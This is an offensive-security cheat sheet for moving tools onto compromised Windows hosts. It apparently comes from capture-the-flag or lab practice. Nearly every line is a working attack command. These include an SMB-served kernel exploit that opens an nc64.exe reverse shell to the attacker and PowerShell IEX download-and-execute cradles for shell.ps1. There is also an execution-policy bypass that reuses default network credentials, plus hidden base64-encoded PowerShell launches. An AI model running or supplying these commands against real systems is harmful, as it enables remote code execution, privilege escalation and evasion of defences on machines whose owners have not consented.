# Transfer Files

## SMB Share

```bash
# Start SMB Share
sudo python3 smbserver.py -smb2support [my share name] [directory to share]

# Copy files from the share
Copy-Item -Path \\10.10.14.22\share\winpeas.exe -Destination C:\windows\temp\ -Force

# Windows can execute files in Kali SHARE
Example of kernel exploit below 
\\10.10.14.22\share\ms15-051x64.exe "\\10.10.14.22\share\nc64.exe -e cmd.exe 10.10.14.22 443"
```

## Powershell

```powershell
# Download File
certutil.exe -urlcache -split -f http://10.10.14.10:8000/nc64.exe C:\\Users\\Public\\nc64.exe
IWR -uri http://192.168.49.134/evil.exe -outfile C:\backup\evil.exe

# Download and run reverse shell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.20:80/shell.ps1')"
(new-object net.webclient).downloadfile('http://10.10.14.22:80/JuicyPotato.exe', 'C:\Windows\Temp\JuicyPotato.exe')
powershell -c iwr -uri http://10.10.14.13:80/winpeas.exe -o c:\users\blake\downloads\wp.exe

# Bypass policy
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.14.20/shell.ps1')|iex"

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.13.14.7/script.ps1')

powershell -W Hidden -nop -noni -enc <base64 text>
```

## Base64 encoded file

```powershell
echo "IEX(New-Object Net.WebClient).downloadString('http://10.13.14.7/shell.ps1')" |iconv -t UTF-16LE | base64 -w 0

powershell -nop -enc ASDKnxADadaSDASDikA
```